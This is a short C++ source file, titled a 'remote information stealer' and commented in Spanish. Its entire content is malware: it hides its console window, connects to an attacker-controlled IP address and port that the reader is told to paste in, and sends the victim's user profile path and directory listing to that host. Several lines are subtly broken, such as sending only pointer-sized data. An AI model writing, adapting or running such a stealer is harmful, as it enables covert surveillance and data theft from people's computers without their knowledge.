// REMOTE INFORMATION STEALER BY BOUNTYHACKERS

// Usamos las utilidades winsock y no queremos que el compilador se queje de las funcionalidades anteriores utilizadas, 
// ya que el siguiente código es suficiente para nuestras necesidades.
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib") // Necesitamos la biblioteca Ws2_32.lib para usar la funcionalidad de sockets (redes) en Windows.
#include <iostream> // incluye utilidades estándar de entrada/salida
#include <winsock2.h> // incluye utilidades de red
#include <stdio.h> // incluye utilidades estándar de entrada/salida (necesarias para perror())
#include <stdlib.h> // incluye utilidades estándar de entrada/salida
#include <dirent.h> // incluye utilidades de directorio
#include <string> // incluye utilidades de cadena


char* userDirectory() {
    char* pPath;
    pPath = getenv("USERPROFILE");

    if (pPath!=NULL) {
        return pPath;
    }
    else {
        perror("");
    }
}


int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_addr.s_addr = inet_addr("10.10.15.2"); //HERE YOU PASTE THE IP ADDRESS
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);

    connect(server, (SOCKADDR *)&addr, sizeof(addr));

    char* pPath = userDirectory();
    send(server, pPath, sizeof(pPath), 0);
    send(server, "\n", 1, 0);

    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir(pPath)) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            send(server, ent->d_name, sizeof(ent->d_name), 0);
            send(server, "\n", 1, 0);
            memset(ent->d_name, 0, sizeof(ent->d_name));
        }
        closedir(dir);
    }
    else {
        perror("");
    }

    closesocket(server);
    WSACleanup();
}

